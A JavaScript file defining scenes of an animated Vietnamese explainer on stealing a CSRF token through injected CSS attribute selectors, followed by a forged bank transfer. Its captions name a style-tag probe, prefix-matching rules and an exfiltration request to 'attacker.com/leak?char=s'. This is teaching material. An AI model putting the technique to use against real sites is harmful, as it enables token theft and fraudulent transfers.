// Scene Definitions with Realistic Technical Narrative and Safe Bounds
import { MathUtils } from './math.js';

export const SCENES = [
  // -------------------------------------------------------------
  // SCENE 1: THE BASELINE CONTEXT (Why CSRF Tokens Exist)
  // -------------------------------------------------------------
  {
    id: 1,
    title: "Bối Cảnh: Tại Sao CSRF Token Lại Cực Kỳ Quan Trọng?",
    subtitle: "Trình duyệt tự đính kèm Cookie đăng nhập trong mọi request. Nếu không có CSRF Token, kẻ xấu có thể chuyển sạch tiền của bạn!",
    duration: 8.5,
    camera: { x: 0, y: 0, zoom: 0.82 },
    draw(renderer, ctx, p, state) {
      const revealAttacker = MathUtils.clamp((p - 0.08) * 4, 0, 1);
      const revealApp = MathUtils.clamp((p - 0.28) * 4, 0, 1);
      const revealVictim = MathUtils.clamp((p - 0.48) * 4, 0, 1);
      const connAlpha = MathUtils.clamp((p - 0.72) * 3.5, 0, 0.75);

      if (p > 0.15) {
        renderer.drawRealmMarkers(ctx, Math.min(revealAttacker, revealVictim));
      }

      // 1. Attacker Realm
      if (revealAttacker > 0) {
        renderer.drawAttackerNode(ctx, -600, -120, {
          alpha: MathUtils.ease.easeOutCubic(revealAttacker),
          scale: MathUtils.lerp(0.8, 1, revealAttacker)
        });
        renderer.drawAttackerServerNode(ctx, -600, 160, {
          alpha: MathUtils.ease.easeOutCubic(revealAttacker),
          scale: MathUtils.lerp(0.8, 1, revealAttacker)
        });
      }

      // 2. Web Application (Bank)
      if (revealApp > 0) {
        renderer.drawWebApplicationNode(ctx, 0, -100, {
          alpha: MathUtils.ease.easeOutCubic(revealApp),
          scale: MathUtils.lerp(0.8, 1, revealApp)
        });
      }

      // 3. Victim Browser (Contains bank account & CSRF token)
      if (revealVictim > 0) {
        renderer.drawVictimBrowser(ctx, 600, 10, {
          alpha: MathUtils.ease.easeOutCubic(revealVictim),
          scale: MathUtils.lerp(0.8, 1, revealVictim),
          deepInspection: false
        });
      }

      // Connecting curves
      if (connAlpha > 0) {
        // Attacker -> Web App
        renderer.drawConnectionCurve(
          ctx,
          { x: -548, y: -120 },
          { x: -360, y: -180 },
          { x: -200, y: -160 },
          { x: -75, y: -100 },
          { color: '#f43f5e', alpha: connAlpha }
        );

        // Web App -> Victim
        renderer.drawConnectionCurve(
          ctx,
          { x: 75, y: -100 },
          { x: 230, y: -150 },
          { x: 390, y: -80 },
          { x: 600 - 275, y: -30 },
          { color: '#818cf8', alpha: connAlpha }
        );
      }
    }
  },

  // -------------------------------------------------------------
  // SCENE 2: RECONNAISSANCE & VULNERABILITY DISCOVERY
  // -------------------------------------------------------------
  {
    id: 2,
    title: "Nhận Diện Lỗ Hổng: Kẻ Tấn Công Phát Hiện Điểm Yếu Ra Sao?",
    subtitle: "Kẻ tấn công nhập thử thẻ <style> vào ô Bio/Theme. Thấy trang đổi màu -> Biết ngay server bị lỗi nhúng CSS (Unescaped Injection)!",
    duration: 8.5,
    camera: { x: -300, y: -80, zoom: 1.1 },
    draw(renderer, ctx, p, state) {
      renderer.drawRealmMarkers(ctx, 0.4);

      // Attacker node showing reconnaissance test
      renderer.drawAttackerNode(ctx, -600, -120, {
        highlight: p < 0.35,
        alpha: 1,
        showReconProbe: true,
        payloadProgress: p
      });
      renderer.drawAttackerServerNode(ctx, -600, 160, { alpha: 0.55 });

      // Web App receiving test
      const appHit = p > 0.85;
      renderer.drawWebApplicationNode(ctx, 0, -100, {
        highlight: appHit,
        alpha: 1
      });
      renderer.drawVictimBrowser(ctx, 600, 10, { alpha: 0.35 });

      // Network curve: Attacker -> Web App
      const p0 = { x: -548, y: -120 };
      const p1 = { x: -370, y: -200 };
      const p2 = { x: -180, y: -180 };
      const p3 = { x: -75, y: -100 };

      renderer.drawConnectionCurve(ctx, p0, p1, p2, p3, {
        color: '#f43f5e',
        lineWidth: 2.5,
        alpha: 0.85
      });

      // Packet traveling: Recon Test
      if (p >= 0.15 && p <= 0.95) {
        if (!state.scene2Launch && state.sound) {
          state.scene2Launch = true;
          state.sound.playPacketLaunch();
        }

        const packetProgress = MathUtils.clamp((p - 0.2) / 0.65, 0, 1);
        const t = MathUtils.ease.easeInOutCubic(packetProgress);
        const pos = MathUtils.getCubicBezierPoint(p0, p1, p2, p3, t);

        renderer.drawPacket(ctx, pos.x, pos.y, {
          label: "RECON PROBE",
          sublabel: "<style>body{color:red}",
          color: "#f43f5e",
          radius: 14,
          alpha: 1
        });

        if (packetProgress >= 0.98 && !state.scene2Burst) {
          state.scene2Burst = true;
          state.particles.emitShockwave(-75, -100, '#f43f5e', 80);
          state.particles.emitSparks(-75, -100, '#f43f5e', 24);
          if (state.sound) state.sound.playPacketImpact(392);
        }
      }
    }
  },

  // -------------------------------------------------------------
  // SCENE 3: CRAFTING ATTACK MATRIX (Rules for a-z)
  // -------------------------------------------------------------
  {
    id: 3,
    title: "Kẻ Tấn Công Soạn Bộ Quy Tắc CSS Đoán Ký Tự",
    subtitle: "Không biết token là gì, kẻ xấu tạo danh sách kiểm tra mọi chữ (a-z): Nếu bắt đầu bằng chữ nào thì tải ảnh chứa chữ đó!",
    duration: 8.5,
    camera: { x: -320, y: -50, zoom: 1.1 },
    draw(renderer, ctx, p, state) {
      renderer.drawRealmMarkers(ctx, 0.4);

      // Attacker node showing realistic a-z prefix matching rules
      renderer.drawAttackerNode(ctx, -600, -120, {
        highlight: true,
        alpha: 1,
        showPayloadDoc: true,
        payloadProgress: p
      });
      renderer.drawAttackerServerNode(ctx, -600, 160, { alpha: 0.55 });
      renderer.drawWebApplicationNode(ctx, 0, -100, { alpha: 0.8 });
      renderer.drawVictimBrowser(ctx, 600, 10, { alpha: 0.35 });

      // Curve Attacker -> App
      const p0 = { x: -548, y: -120 };
      const p1 = { x: -370, y: -200 };
      const p2 = { x: -180, y: -180 };
      const p3 = { x: -75, y: -100 };

      renderer.drawConnectionCurve(ctx, p0, p1, p2, p3, {
        color: '#f43f5e',
        lineWidth: 2.5,
        alpha: 0.85
      });

      if (p >= 0.25 && p <= 0.95) {
        const packetProgress = MathUtils.clamp((p - 0.25) / 0.65, 0, 1);
        const t = MathUtils.ease.easeInOutCubic(packetProgress);
        const pos = MathUtils.getCubicBezierPoint(p0, p1, p2, p3, t);

        renderer.drawPacket(ctx, pos.x, pos.y, {
          label: "CSS MATRIX (a-z)",
          sublabel: "26+ prefix rules",
          color: "#f43f5e",
          radius: 14,
          alpha: 1
        });
      }
    }
  },

  // -------------------------------------------------------------
  // SCENE 4: SERVER DELIVERS CSS + TARGET FORM TO VICTIM
  // -------------------------------------------------------------
  {
    id: 4,
    title: "Máy Chủ Nhúng CSS Độc Vào Trang Của Nạn Nhân",
    subtitle: "Nạn nhân mở trang ngân hàng. Server vô tình gửi về cả Form bí mật (token='secret_42') lẫn bảng CSS độc của kẻ tấn công.",
    duration: 9.0,
    camera: { x: 290, y: -10, zoom: 1.02 },
    draw(renderer, ctx, p, state) {
      renderer.drawRealmMarkers(ctx, 0.4);

      renderer.drawAttackerNode(ctx, -600, -120, { alpha: 0.3 });
      renderer.drawAttackerServerNode(ctx, -600, 160, { alpha: 0.3 });

      renderer.drawWebApplicationNode(ctx, 0, -100, {
        highlight: p >= 0.45 && p <= 0.6,
        alpha: 1,
        showAssembly: true,
        assemblyPhase: p
      });

      const browserHighlighted = p > 0.85;
      renderer.drawVictimBrowser(ctx, 600, 10, {
        highlight: browserHighlighted,
        alpha: 1,
        deepInspection: false
      });

      // Arc 1: Request (Victim -> Web App)
      const reqP0 = { x: 600 - 275, y: -20 };
      const reqP1 = { x: 390, y: 60 };
      const reqP2 = { x: 200, y: 30 };
      const reqP3 = { x: 75, y: -60 };

      renderer.drawConnectionCurve(ctx, reqP0, reqP1, reqP2, reqP3, {
        color: '#06b6d4',
        alpha: 0.7
      });

      if (p >= 0.05 && p <= 0.45) {
        if (!state.scene4ReqLaunch && state.sound) {
          state.scene4ReqLaunch = true;
          state.sound.playPacketLaunch();
        }

        const t = MathUtils.ease.easeInOutCubic((p - 0.05) / 0.4);
        const pos = MathUtils.getCubicBezierPoint(reqP0, reqP1, reqP2, reqP3, t);
        renderer.drawPacket(ctx, pos.x, pos.y, {
          label: "GET /transfer",
          sublabel: "Cookie: session=xyz",
          color: "#06b6d4",
          radius: 12
        });
      }

      // Arc 2: Response (Web App -> Victim)
      const resP0 = { x: 75, y: -100 };
      const resP1 = { x: 220, y: -160 };
      const resP2 = { x: 380, y: -100 };
      const resP3 = { x: 600 - 275, y: -30 };

      renderer.drawConnectionCurve(ctx, resP0, resP1, resP2, resP3, {
        color: '#818cf8',
        alpha: 0.85,
        flowSpeed: 30
      });

      if (p >= 0.48 && p <= 0.92) {
        if (!state.scene4ResLaunch && state.sound) {
          state.scene4ResLaunch = true;
          state.sound.playPacketLaunch();
        }

        const t = MathUtils.ease.easeInOutCubic((p - 0.48) / 0.42);
        const pos = MathUtils.getCubicBezierPoint(resP0, resP1, resP2, resP3, t);
        renderer.drawDualResponsePacket(ctx, pos.x, pos.y, {
          alpha: 1,
          scale: 1.05
        });

        if (t >= 0.96 && !state.scene4Arrival) {
          state.scene4Arrival = true;
          state.particles.emitShockwave(600 - 275, -30, '#818cf8', 80);
          state.particles.emitSparks(600 - 275, -30, '#06b6d4', 22);
          if (state.sound) state.sound.playPacketImpact(523.25);
        }
      }
    }
  },

  // -------------------------------------------------------------
  // SCENE 5: CRITICAL EXECUTION (Locally inside victim browser)
  // -------------------------------------------------------------
  {
    id: 5,
    title: "Khoảnh Khắc Then Chốt: Trình Duyệt Nạn Nhân Tự So Khớp",
    subtitle: "Toàn bộ việc kiểm tra diễn ra CỤC BỘ TRÊN MÁY NẠN NHÂN. Trình duyệt duyệt qua từng luật CSS để so sánh với thẻ input trong DOM.",
    duration: 9.5,
    camera: { x: 600, y: 25, zoom: 1.12 },
    draw(renderer, ctx, p, state) {
      if (!state.scene5Resonance && p > 0.1 && state.sound) {
        state.scene5Resonance = true;
        state.sound.playResonance();
      }

      renderer.drawVictimBrowser(ctx, 600, 10, {
        highlight: true,
        alpha: 1,
        deepInspection: true,
        stateValue: "secret_42",
        selectedPath: null,
        showBarrier: false,
        showF12Network: false
      });
    }
  },

  // -------------------------------------------------------------
  // SCENE 6: WHY CSS? (CSP BLOCKS JAVASCRIPT)
  // -------------------------------------------------------------
  {
    id: 6,
    title: "Tại Sao Phải Dùng CSS? (Vượt Qua Rào Cản CSP)",
    subtitle: "Chính sách CSP chặn đứng JavaScript (không thể XSS đọc biến). Nhưng CSS vẫn được phép chạy -> Buộc phải dùng kênh kề (Side-Channel)!",
    duration: 9.0,
    camera: { x: 600, y: 25, zoom: 1.12 },
    draw(renderer, ctx, p, state) {
      renderer.drawVictimBrowser(ctx, 600, 10, {
        alpha: 1,
        deepInspection: true,
        stateValue: "secret_42",
        selectedPath: null,
        showBarrier: true,
        showF12Network: false
      });
    }
  },

  // -------------------------------------------------------------
  // SCENE 7: PREFIX MATCHING (Why 'a' Fails and 's' Triggers)
  // -------------------------------------------------------------
  {
    id: 7,
    title: "Bản Chất So Khớp: Tại Sao 'a' Trượt mà 's' Khớp?",
    subtitle: "Token là 'secret_42'. Luật [value^='a'] sai nên im lặng; Luật [value^='s'] ĐÚNG -> Trình duyệt bắt buộc phải tải ảnh nền của chữ 's'!",
    duration: 9.0,
    camera: { x: 600, y: 25, zoom: 1.12 },
    draw(renderer, ctx, p, state) {
      renderer.drawVictimBrowser(ctx, 600, 10, {
        alpha: 1,
        deepInspection: true,
        stateValue: "secret_42",
        selectedPath: "s",
        showBarrier: false,
        showF12Network: true
      });
    }
  },

  // -------------------------------------------------------------
  // SCENE 8: BROWSER SENDS HTTP REQUEST (F12 Network Tab)
  // -------------------------------------------------------------
  {
    id: 8,
    title: "Trình Duyệt Tự Gửi HTTP Request (F12 Network)",
    subtitle: "Để hiển thị ảnh nền, chính trình duyệt tự động gọi: GET https://attacker.com/leak?char=s (Hiện rõ trong F12 Network)!",
    duration: 9.5,
    camera: { x: 0, y: 70, zoom: 0.88 },
    draw(renderer, ctx, p, state) {
      const isVi = renderer.lang === 'vi';

      renderer.drawRealmMarkers(ctx, 0.45);

      renderer.drawAttackerNode(ctx, -600, -120, { alpha: 0.4 });

      const serverReceiving = p > 0.8;
      renderer.drawAttackerServerNode(ctx, -600, 160, {
        highlight: serverReceiving,
        isReceiving: serverReceiving,
        alpha: 1,
        receivedState: serverReceiving ? "s" : null
      });

      renderer.drawWebApplicationNode(ctx, 0, -100, { alpha: 0.35 });

      renderer.drawVictimBrowser(ctx, 600, 10, {
        alpha: 1,
        highlight: p < 0.3,
        deepInspection: true,
        stateValue: "secret_42",
        selectedPath: "s",
        showBarrier: false,
        showF12Network: true
      });

      // Exfiltration pipeline from Victim Browser to Attacker Server
      const p0 = { x: 600 - 275, y: 120 };
      const p1 = { x: 260, y: 260 };
      const p2 = { x: -200, y: 260 };
      const p3 = { x: -600 + 56, y: 160 };

      renderer.drawConnectionCurve(ctx, p0, p1, p2, p3, {
        color: '#06b6d4',
        lineWidth: 2.6,
        flowSpeed: 36,
        alpha: 0.95
      });

      // Browser-generated request traveling
      if (p >= 0.15 && p <= 0.95) {
        if (!state.scene8Launch && state.sound) {
          state.scene8Launch = true;
          state.sound.playPacketLaunch();
        }

        const t = MathUtils.ease.easeInOutCubic((p - 0.15) / 0.75);
        const pos = MathUtils.getCubicBezierPoint(p0, p1, p2, p3, t);

        renderer.drawPacket(ctx, pos.x, pos.y, {
          label: "HTTP GET (F12)",
          sublabel: "/leak?char=s",
          color: "#06b6d4",
          radius: 14
        });

        if (t >= 0.98 && !state.scene8Arrival) {
          state.scene8Arrival = true;
          state.particles.emitShockwave(-600 + 56, 160, '#f43f5e', 90);
          state.particles.emitSparks(-600 + 56, 160, '#06b6d4', 30);
          if (state.sound) state.sound.playPacketImpact(440);
        }
      }

      // Banner
      ctx.save();
      const bannerText = isVi ? "TRÌNH DUYỆT TỰ ĐỘNG GỌI HTTP REQUEST ĐỂ LẤY ẢNH NỀN (F12 NETWORK)" : "BROWSER AUTONOMOUSLY SENDS HTTP GET TO FETCH BACKGROUND IMAGE (F12 NETWORK)";
      ctx.font = `700 11px ${FONT_FAMILY}`;
      const bw = ctx.measureText(bannerText).width + 36;

      ctx.fillStyle = 'rgba(6, 182, 212, 0.18)';
      ctx.strokeStyle = '#06b6d4';
      ctx.lineWidth = 1.6;
      renderer.roundRect(ctx, -bw / 2, 290, bw, 36, 18);
      ctx.fill();
      ctx.stroke();

      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';
      ctx.fillStyle = '#ffffff';
      ctx.fillText(bannerText, 0, 308);
      ctx.restore();
    }
  },

  // -------------------------------------------------------------
  // SCENE 9: ATTACKER INSPECTS ACCESS LOG
  // -------------------------------------------------------------
  {
    id: 9,
    title: "Kẻ Tấn Công Đọc Access Log & Suy Ra Ký Tự",
    subtitle: "Mở file log Nginx: Thấy có request /leak?char=s -> Kẻ xấu chắc chắn 100% ký tự đầu tiên của CSRF Token là chữ 's'!",
    duration: 9.0,
    camera: { x: -350, y: 160, zoom: 1.15 },
    draw(renderer, ctx, p, state) {
      renderer.drawAttackerNode(ctx, -600, -120, { alpha: 0.5 });

      renderer.drawAttackerServerNode(ctx, -600, 160, {
        highlight: true,
        alpha: 1,
        isReceiving: true,
        receivedState: "s"
      });

      // Deduction diagram: Log entry -> Match CSS rule -> Deduced character
      renderer.drawInferenceDiagram(ctx, -140, 160, p);
    }
  },

  // -------------------------------------------------------------
  // SCENE 10: FULL BRUTE-FORCE EXTRACTION LOOP
  // -------------------------------------------------------------
  {
    id: 10,
    title: "Vòng Lặp Dò Ký Tự: Trộm Trọn Vẹn Chuỗi Token",
    subtitle: "Biết 's' -> Dò 'se' -> Dò 'sec' -> Dò 'secret_42'. Lặp lại từng đợt cho đến khi trích xuất được toàn bộ mã bí mật!",
    duration: 10.0,
    camera: { x: 0, y: 15, zoom: 0.82 },
    draw(renderer, ctx, p, state) {
      if (!state.scene10Resonance && p > 0.05 && state.sound) {
        state.scene10Resonance = true;
        state.sound.playResonance();
      }

      renderer.drawRealmMarkers(ctx, 0.4);

      renderer.drawAttackerNode(ctx, -600, -120, { alpha: 0.4 });
      renderer.drawAttackerServerNode(ctx, -600, 160, { alpha: 0.4 });
      renderer.drawWebApplicationNode(ctx, 0, -100, { alpha: 0.4 });
      renderer.drawVictimBrowser(ctx, 600, 10, { alpha: 0.4, deepInspection: false });

      // Concrete iteration breakdown table
      renderer.drawFullAttackChain(ctx, p);
    }
  },

  // -------------------------------------------------------------
  // SCENE 11: CSRF ATTACK EXPLOITATION & ACCOUNT COMPROMISE
  // -------------------------------------------------------------
  {
    id: 11,
    title: "Hậu Quả: Dùng Token Vừa Trộm Để Chuyển Hết Tiền (CSRF)",
    subtitle: "Có được token 'secret_42', kẻ xấu gửi request chuyển 100tr kèm Cookie của nạn nhân -> Ngân hàng chấp thuận -> Mất tiền!",
    duration: 10.5,
    camera: { x: 0, y: 15, zoom: 0.85 },
    draw(renderer, ctx, p, state) {
      renderer.drawRealmMarkers(ctx, 0.25);

      renderer.drawAttackerNode(ctx, -600, -120, { alpha: 0.3 });
      renderer.drawAttackerServerNode(ctx, -600, 160, { alpha: 0.3 });
      renderer.drawWebApplicationNode(ctx, 0, -100, { alpha: 0.3 });
      renderer.drawVictimBrowser(ctx, 600, 10, { alpha: 0.3 });

      renderer.drawCSRFContext(ctx, 0, 15, p);
    }
  }
];

const FONT_FAMILY = "'Segoe UI', Roboto, -apple-system, system-ui, Arial, sans-serif";
